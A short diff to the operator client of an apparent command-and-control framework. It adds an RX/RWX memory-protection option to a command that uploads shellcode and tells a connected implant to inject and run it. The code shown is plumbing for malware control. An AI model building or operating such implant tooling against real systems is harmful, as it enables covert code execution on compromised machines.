@@ -157,11 +157,15 @@ def cmd_shell(args: List[str], app):
 # shellcode file from on the server, reads it into memory, and executes
 def cmd_shellcode_inject(args: List[str], app):
     # Must be 3 args
-    client_errors.arg_len_error(args, min=2, max=3)
+    client_errors.arg_len_error(args, min=2, max=4)
 
     # Error if not connected to implant
     if not connected_to_implant():
         raise client_errors.NotConnectedToImplant
+
+    if len(args) == 4:
+        if args[3] != "RX" and args[3] != "RWX":
+            raise client_errors.CommandDoesntExist
 
     # Create a file id for the file to be saved
     file_id = encryption.id_generator(N=32)
@@ -170,7 +174,11 @@ def cmd_shellcode_inject(args: List[str], app):
     cmd_id = encryption.id_generator(N=32)
 
     # Create the command string
-    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT, [file_id, args[2]]) 
+    # If RW or RWX specified
+    if len(args) == 4:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT, [file_id, args[2], args[3]]) 
+    else:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT, [file_id, args[2], "RWX"]) 
 
     # Post the file, if it doesn't exist, will raise FileDoesntExist exception
     uploaded_filename = post_file_command(file_path=args[1],
